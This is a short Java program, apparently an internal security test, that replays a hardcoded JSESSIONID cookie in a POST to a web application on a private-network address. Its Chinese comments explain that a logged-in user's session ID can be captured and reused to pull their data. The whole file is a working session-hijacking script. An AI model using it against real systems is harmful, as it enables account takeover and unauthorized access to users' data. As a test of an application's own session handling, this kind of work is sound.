package assam.http.secure;

import java.io.IOException;
import java.net.URL;

import java.net.HttpURLConnection;


public class JsessionAttackTest {

	private static final String web = "http://192.168.110.241:8080/SmartCatchMposZkWeb/pages/index.zul?theme=cerulean&target=m2/M204Init.zul";
	
	//jsession
	private static final String jsession = "7AEE1B273091D08FF41BB18609A29A36";
	
	//傳入參數 ex: id=123
	private static final String data = "";
	
	
	//JSESSIONID攻擊測試
	//在登入網頁端後可以嘗試取得JSESSIONID並附加在request的cookie中
	//這樣可以直接透過已登入者的JSESSIONID取得相關資料
	public static void main(String[] args) throws IOException {
		URL url = new URL(web);
		
		HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
		
		urlConn.setRequestMethod("POST");
		
		urlConn.setDoOutput(true);
		urlConn.setDoInput(true);
		urlConn.setUseCaches(false);
		urlConn.setAllowUserInteraction(true);
		urlConn.setInstanceFollowRedirects(true);

		HttpURLConnection.setFollowRedirects(true);
		
		urlConn.setRequestProperty(
				"User-agent",
				"Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW; rv:1.9.1.2) "
						+ "Gecko/20090729 Firefox/3.5.2 GTB5 (.NET CLR 3.5.30729)");
		urlConn.setRequestProperty("Accept",
				"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		urlConn.setRequestProperty("Accept-Language",
				"zh-tw,en-us;q=0.7,en;q=0.3");
		urlConn.setRequestProperty("Accept-Charse", "Big5,utf-8;q=0.7,*;q=0.7");
		urlConn.setRequestProperty("Cookie", "JSESSIONID=" + jsession); 
		
		urlConn.setRequestProperty("Content-Type",
				"application/x-www-form-urlencoded");
		
		java.io.DataOutputStream dos = new java.io.DataOutputStream(
				urlConn.getOutputStream());
		dos.writeBytes(data);

		java.io.BufferedReader rd = new java.io.BufferedReader(
				new java.io.InputStreamReader(urlConn.getInputStream(), "UTF-8"));
		String line;
		while ((line = rd.readLine()) != null) {
			System.out.println(line);
		}

		rd.close(); 
	}

}
